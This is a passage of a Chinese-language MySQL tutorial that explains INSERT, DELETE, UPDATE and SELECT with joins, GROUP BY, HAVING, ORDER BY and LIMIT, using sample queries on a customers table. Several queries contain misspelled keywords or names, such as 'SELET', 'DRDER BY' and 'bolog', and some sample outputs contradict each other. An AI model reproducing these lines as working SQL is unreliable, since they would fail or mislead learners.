class="code"><pre><span class="line"><span class="keyword">INSERT</span> [<span class="keyword">INTO</span>] tbl_name <span class="keyword">SET</span> col_name <span class="operator">=</span> &#123;expr <span class="operator">|</span> <span class="keyword">DEFAULT</span>&#125;, ...</span><br></pre></td></tr></table></figure><p>插入数据实例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blog.customers <span class="keyword">SET</span> cust_name<span class="operator">=</span><span class="string">&#x27;Peter&#x27;</span>, cust_address<span class="operator">=</span><span class="string">&#x27;武汉市&#x27;</span>,cust_sex<span class="operator">=</span><span class="keyword">DEFAULT</span>;</span><br></pre></td></tr></table></figure><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><p>在MySQL中，可以使用<code>DELETE</code>语句删除表中的一行或多行数据。其语法格式是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> tbl_name [<span class="keyword">WHERE</span> where_condition]</span><br></pre></td></tr></table></figure><p>实例：</p><p>删除数据库<code>blog</code>的<code>customers</code>中客户<code>id</code>为1的数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> blog.customers <span class="keyword">WHERE</span> cust_id<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><p>在MySQL中，可以使用<code>UPDATE</code>语句来修改更新一个表中的数据，起语法格式是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> tbl_name <span class="keyword">SET</span> col_name<span class="operator">=</span>&#123;expr <span class="operator">|</span> DAFAULT&#125; [,col_name2<span class="operator">=</span>&#123;expr <span class="operator">|</span> <span class="keyword">DEFAULT</span>&#125;].. [<span class="keyword">WHERE</span> where_condition] [<span class="keyword">ORDER</span> BY..] [LIMIT row_count]</span><br></pre></td></tr></table></figure><p>实例：</p><p>修改数据库<code>blog</code>的表<code>customers</code>中ID为7的客户地址更新为北京市</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> blog.customers <span class="keyword">SET</span> cust_address<span class="operator">=</span><span class="string">&#x27;北京市&#x27;</span> <span class="keyword">WHERE</span> cust_id<span class="operator">=</span><span class="number">7</span>;</span><br></pre></td></tr></table></figure><h3 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h3><h4 id="SELECT语句查询"><a href="#SELECT语句查询" class="headerlink" title="SELECT语句查询"></a>SELECT语句查询</h4><p>数据查询是使用<code>SELECT</code>语句进行数据查询，该功能强大，使用灵活，其数学理论基础是关系数据模型中对表对象的一组关系运算，即选择，投影和连接。</p><p><code>SLECT</code>语句中各子句的使用次序及说明</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span>子句组装数据（包括通过<span class="keyword">ON</span>进行连接）；</span><br><span class="line"><span class="keyword">WHERE</span>子句进行条件筛选；</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span>分组 ；</span><br><span class="line">使用聚集函数进行计算；</span><br><span class="line"><span class="keyword">HAVING</span>筛选分组；</span><br><span class="line">计算所有的表达式；</span><br><span class="line"><span class="keyword">SELECT</span> 的字段；</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span>排序；</span><br><span class="line">LIMIT筛选。</span><br></pre></td></tr></table></figure><h4 id="选择指定的列查询"><a href="#选择指定的列查询" class="headerlink" title="选择指定的列查询"></a>选择指定的列查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_name, cust_sex, cust_address <span class="keyword">FROM</span> blog.customers;</span><br></pre></td></tr></table></figure><h5 id="查询表的所有信息"><a href="#查询表的所有信息" class="headerlink" title="查询表的所有信息"></a>查询表的所有信息</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> blog.customers;</span><br></pre></td></tr></table></figure><h5 id="查询定义并使用列的别名"><a href="#查询定义并使用列的别名" class="headerlink" title="查询定义并使用列的别名"></a>查询定义并使用列的别名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_name, cust_address <span class="keyword">as</span> 地址, cust_contact <span class="keyword">FROM</span> blog.customers;</span><br></pre></td></tr></table></figure><h5 id="替换查询结果集合中的数据"><a href="#替换查询结果集合中的数据" class="headerlink" title="替换查询结果集合中的数据"></a>替换查询结果集合中的数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_name, <span class="keyword">CASE</span> <span class="keyword">WHEN</span> cust_sex<span class="operator">=</span><span class="number">1</span> <span class="keyword">THEN</span> <span class="string">&#x27;男&#x27;</span> <span class="keyword">ELSE</span> <span class="string">&#x27;女&#x27;</span> <span class="keyword">END</span> <span class="keyword">AS</span> 性别 <span class="keyword">FROM</span> blog.customers;</span><br></pre></td></tr></table></figure><h5 id="计算列值"><a href="#计算列值" class="headerlink" title="计算列值"></a>计算列值</h5><p>使用<code>SELECT</code>语句对列进行查询时候，在结果集中可以输出对列值计算后的值，如在查询时候，对<code>cust_id</code>加上数字100的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_name,cust_sex,cust_id<span class="operator">+</span><span class="number">100</span> <span class="keyword">FROM</span> blog.customers;</span><br></pre></td></tr></table></figure><h4 id="FROM子句与多表链接查询"><a href="#FROM子句与多表链接查询" class="headerlink" title="FROM子句与多表链接查询"></a>FROM子句与多表链接查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tbl1 <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> tbl2;</span><br><span class="line">SELET <span class="operator">*</span> <span class="keyword">FROM</span> tb1,tb2;</span><br></pre></td></tr></table></figure><h5 id="内连接查询"><a href="#内连接查询" class="headerlink" title="内连接查询"></a>内连接查询</h5><p>内链接是一种最常见的连接类型，它是通过查找中设置链接条件的方式，来移除查询集合中某些数据行之后的交叉链接。简单来说就是利用条件判断表达式中的比较运算符来组合两张表的记录，其目的是为了消除交叉中的某些数据行。</p><p>其语法是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> some_columns</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">table</span></span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> some_conditions;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> customers <span class="keyword">INNER</span> <span class="keyword">JOIN</span> customers2 <span class="keyword">ON</span> customers.cust_name <span class="operator">=</span> customers2.cust_name;</span><br></pre></td></tr></table></figure><h5 id="外连接查询"><a href="#外连接查询" class="headerlink" title="外连接查询"></a>外连接查询</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> customers <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> customers2 <span class="keyword">ON</span> customers.cust_name <span class="operator">=</span> customers2.cust_name;</span><br></pre></td></tr></table></figure><p>尽管优肯对2张表分别使用内连接和外连接之后，可能返回的结果相同，但实质上这两类连接操作的语义是不同的，他们的差别在于外连接一定会在结果集中提供数据行，无论该行数据能否在另外一张表找出相匹配的数据行。</p><h4 id="WHERE子句与条件查询"><a href="#WHERE子句与条件查询" class="headerlink" title="WHERE子句与条件查询"></a>WHERE子句与条件查询</h4><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">&#x3D;</td><td align="left">等于</td></tr><tr><td align="left">&lt;&gt;</td><td align="left">不等于。<strong>注释：</strong>在 SQL 的一些版本中，该操作符可被写成 !&#x3D;</td></tr><tr><td align="left">&gt;</td><td align="left">大于</td></tr><tr><td align="left">&lt;</td><td align="left">小于</td></tr><tr><td align="left">&gt;&#x3D;</td><td align="left">大于等于</td></tr><tr><td align="left">&lt;&#x3D;</td><td align="left">小于等于</td></tr><tr><td align="left">BETWEEN</td><td align="left">在某个范围内</td></tr><tr><td align="left">LIKE</td><td align="left">搜索某种模式</td></tr><tr><td align="left">IN</td><td align="left">指定针对某个列的多个可能值</td></tr></tbody></table><h5 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h5><p>在数据库<code>blog</code>的表<code>customers</code>中查找所有男性客户的信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> blog.customers <span class="keyword">WHERE</span> cust_sex<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure><h5 id="判断范围查询"><a href="#判断范围查询" class="headerlink" title="判断范围查询"></a>判断范围查询</h5><p>在数据库<code>blog</code>的表<code>customers</code>中查询客户<code>id</code>在1~100直接的信息数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> bolog.customers <span class="keyword">WHERE</span> cust_id <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">100</span>;</span><br></pre></td></tr></table></figure><p>在数据库<code>blog</code>的表<code>customers</code>中查询客户id号1，9，和19号的三个客户信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> blog.customers <span class="keyword">WHERE</span> cust_id <span class="keyword">IN</span>(<span class="number">1</span>,<span class="number">9</span>,<span class="number">19</span>);</span><br></pre></td></tr></table></figure><p>判断空值</p><p>​当需要判定一个表达式是否为空值时，可以使用关键字<code>“IS NULL”</code>来实现</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_name <span class="keyword">FROM</span> blog.customers <span class="keyword">WHERE</span> cust_contact <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure><h5 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h5><p>可嵌套在其他<code>SELECT</code>查询中的<code>SELECT</code>查询，例如：学生信息登记表<code>tb_sudent</code>和学生成绩表<code>tb_score</code>，使用子查询的方式查询所选课程高于80分的学生学号和姓名信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> studentNo,studentName</span><br><span class="line"><span class="keyword">FROM</span> tb_sudent</span><br><span class="line"><span class="keyword">WHERE</span> studentNo <span class="keyword">IN</span>(<span class="keyword">SELECT</span> studentNo <span class="keyword">FROM</span> tb_score <span class="keyword">WHERE</span> score <span class="operator">&gt;</span> <span class="number">80</span>);</span><br></pre></td></tr></table></figure><h4 id="GROUP-BY-子句与分组数据"><a href="#GROUP-BY-子句与分组数据" class="headerlink" title="GROUP BY 子句与分组数据"></a>GROUP BY 子句与分组数据</h4><p>在<code>SELECT</code>语句中，运行试验<code>GROUP BY</code>子句，将结果集合的数据进行根据选择列的值进行逻辑分组：</p><p>其语法格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GROUP BY &#123;col_name | expr | postion&#125;[ASC |DESC], ... [WITH ROLLUP]</span><br></pre></td></tr></table></figure><p>实例一：在数据库<code>blog</code>的表<code>customers</code>中查询获取一个数据结果集，要求该结果中分别包含每个相同地址的男性客户人数和女性客户人数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_address,cust_sex, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> <span class="string">&#x27;人数&#x27;</span> <span class="keyword">FROM</span> blog.customers <span class="keyword">GROUP</span> <span class="keyword">BY</span> cust_address,cust_sex;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+--------+</span></span><br><span class="line"></span><br><span class="line"><span class="operator">|</span> cust_address <span class="operator">|</span> cust_sex <span class="operator">|</span> 人数 <span class="operator">|</span></span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+--------+</span></span><br><span class="line"></span><br><span class="line"><span class="operator">|</span>    北京市     <span class="operator">|</span>    <span class="number">1</span>     <span class="operator">|</span>   <span class="number">1</span>    <span class="operator">|</span></span><br><span class="line"></span><br><span class="line"><span class="operator">|</span>    武汉市     <span class="operator">|</span>    <span class="number">0</span>     <span class="operator">|</span>   <span class="number">2</span>     <span class="operator">|</span></span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+--------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>实例二：在数据库<code>blog</code>的表<code>customers</code>中查询获取一个数据结果集，要求该结果中包含每个相同地址的男性客户人数，女性客户人数，总人数以及客户的总人数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_address,cust_sex, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> <span class="string">&#x27;人数&#x27;</span> <span class="keyword">FROM</span> blog.customers <span class="keyword">GROUP</span> <span class="keyword">BY</span> cust_address,cust_sex <span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span> cust_address <span class="operator">|</span> cust_sex <span class="operator">|</span>  人数   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span> 北京市 <span class="operator">|</span>    <span class="number">1</span>     <span class="operator">|</span>   <span class="number">1</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    北京市     <span class="operator">|</span>    <span class="keyword">NULL</span>  <span class="operator">|</span>   <span class="number">1</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     武汉市    <span class="operator">|</span>    <span class="number">2</span>     <span class="operator">|</span>   <span class="number">2</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     武汉市    <span class="operator">|</span>    <span class="keyword">NULL</span>  <span class="operator">|</span>   <span class="number">2</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="keyword">NULL</span>    <span class="operator">|</span>    <span class="keyword">NULL</span>  <span class="operator">|</span>   <span class="number">3</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+--------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h4 id="HAVING子句"><a href="#HAVING子句" class="headerlink" title="HAVING子句"></a>HAVING子句</h4><p>在<code>SELECT</code>子句中，除了能使用<code>GROUP BY</code>子句分组数据之外，还可以使用<code>HAVING</code>子句来过滤分组</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_name,cust_address <span class="keyword">FROM</span> blog.customers <span class="keyword">GROUP</span> <span class="keyword">BY</span> cust_address,cust_name <span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&lt;=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> cust_name,cust_address <span class="keyword">FROM</span> blog.customers <span class="keyword">GROUP</span> <span class="keyword">BY</span> cust_address,cust_name <span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&lt;=</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------+</span></span><br><span class="line"><span class="operator">|</span> cust_name <span class="operator">|</span> cust_address <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------+</span></span><br><span class="line"><span class="operator">|</span>   Peter   <span class="operator">|</span>    北京市     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   Peter   <span class="operator">|</span>    武汉市     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------+</span></span><br></pre></td></tr></table></figure><h4 id="ORDER-BY-子句"><a href="#ORDER-BY-子句" class="headerlink" title="ORDER BY 子句"></a>ORDER BY 子句</h4><p>在<code>SELECT</code>语句中，可以使用<code>ORDER BY</code>子句将集中的数据按一定的顺序进行排序，否则结果集中数据行的顺序是不可预料的。其语法格式为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRDER <span class="keyword">BY</span> &#123;col_name <span class="operator">|</span> expr <span class="operator">|</span> postion&#125; [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>], ..</span><br></pre></td></tr></table></figure><p>实例：在数据库<code>blog</code>的表<code>customers</code>中依次按照客户姓名和地址的降序方式，输出客户的姓名和性别。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_name, cust_sex <span class="keyword">FROM</span> blog.customers <span class="keyword">ORDER</span> <span class="keyword">BY</span> cust_name <span class="keyword">DESC</span>, cust_address <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><p>输出结果:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="operator">|</span> cust_name <span class="operator">|</span> cust_sex <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="operator">|</span> Peter <span class="operator">|</span>  <span class="number">0</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>Peter <span class="operator">|</span>  <span class="number">0</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Peter <span class="operator">|</span>  <span class="number">1</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h4 id="LIMIT子句"><a href="#LIMIT子句" class="headerlink" title="LIMIT子句"></a>LIMIT子句</h4><p>当使用<code>SELECT</code>语句返回的结果集中行数很多时候，为了便于用户对结果浏览和操作，使用<code>LIMIT</code>子句来限制被<code>SELECT</code>语句返回的行数。其语法格式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT &#123;[<span class="keyword">offset</span>,] row_count <span class="operator">|</span> row_count <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;</span><br></pre></td></tr></table></figure><p>实例</p><p>在数据库<code>blog</code>的表<code>customers</code>中查找索引为1到索引3的客户姓名信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_id,cust_name <span class="keyword">FROM</span> blog.customers <span class="keyword">ORDER</span> <span class="keyword">BY</span> cust_id LIMIT <span class="number">1</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>也可以写成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_id,cust_name <span class="keyword">FROM</span> blog.customers <span class="keyword">ORDER</span> <span class="keyword">BY</span> cust_id LIMIT <span class="number">3</span> <span class="keyword">OFFSET</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
